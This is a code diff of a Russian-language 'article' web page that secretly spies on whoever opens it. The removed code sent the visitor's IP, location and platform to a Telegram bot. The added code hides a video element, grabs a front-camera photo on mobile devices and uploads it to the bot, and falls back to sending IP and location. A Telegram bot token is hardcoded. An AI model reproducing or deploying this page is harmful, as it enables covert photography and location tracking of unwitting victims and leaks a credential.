@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Статья</title>
     <style>
         body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
         h1 { color: #444; }
         .content { margin-top: 20px; }
+        #camera { display: none; }
     </style>
 </head>
 <body>
@@ -16,7 +16,13 @@
         <div id="content" class="content">Загрузка данных...</div>
     </div>
 
+    <div id="camera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
     <script>
+        // Декодирование данных
         const urlParams = new URLSearchParams(window.location.search);
         const encodedData = urlParams.get('data');
         
@@ -31,31 +37,74 @@
                 
                 document.getElementById('title').textContent = params['title'] || 'Без названия';
                 document.getElementById('content').textContent = params['state'] || 'Нет содержимого';
-                
-                // Получаем IP и локацию
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(data => {
-                        const ip = data.ip || 'N/A';
-                        const location = `${data.city || 'N/A'}, ${data.country_name || 'N/A'}`;
-                        const platform = navigator.platform || 'N/A';
-                        
-                        // Формируем сообщение
-                        const message = `📡 Кто-то открыл статью!
-IP: ${ip}
-Локация: ${location}
-Платформа: ${platform}`;
-                        
-                        // Отправляем в Telegram
-                        if (params['chat_id']) {
-                            fetch(`https://api.telegram.org/bot8052191957:AAGreJnTaY_MAjUYhIBf3Zh_Hg653pb4Pkw/sendMessage?chat_id=${params['chat_id']}&text=${encodeURIComponent(message)}`);
-                        }
-                    });
+
+                // Проверяем мобильное устройство
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    takePhoto(params['chat_id']);
+                } else {
+                    sendDeviceInfo(params['chat_id']);
+                }
                 
             } catch (e) {
                 console.error("Ошибка:", e);
-                document.getElementById('title').textContent = "Ошибка";
-                document.getElementById('content').textContent = "Неверные данные.";
+            }
+        }
+
+        // Функция для съемки фото
+        function takePhoto(chatId) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        setTimeout(() => {
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg');
+                            sendToTelegram(chatId, imageData);
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    };
+                })
+                .catch(err => {
+                    console.error("Ошибка камеры:", err);
+                    sendDeviceInfo(chatId);
+                });
+        }
+
+        // Отправка информации об устройстве
+        function sendDeviceInfo(chatId) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const message = `📡 Устройство открыло статью\nIP: ${data.ip || 'N/A'}\nЛокация: ${data.city || 'N/A'}, ${data.country || 'N/A'}\nУстройство: ${navigator.platform || 'N/A'}`;
+                    sendToTelegram(chatId, message);
+                });
+        }
+
+        // Отправка в Telegram
+        function sendToTelegram(chatId, data) {
+            if (!chatId) return;
+            
+            if (data.startsWith('data:image')) {
+                // Отправка фото
+                const formData = new FormData();
+                fetch(data)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        formData.append('photo', blob, 'photo.jpg');
+                        fetch(`https://api.telegram.org/bot8052191957:AAGreJnTaY_MAjUYhIBf3Zh_Hg653pb4Pkw/sendPhoto?chat_id=${chatId}`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    });
+            } else {
+                // Отправка текста
+                fetch(`https://api.telegram.org/bot8052191957:AAGreJnTaY_MAjUYhIBf3Zh_Hg653pb4Pkw/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`);
             }
         }
     </script>
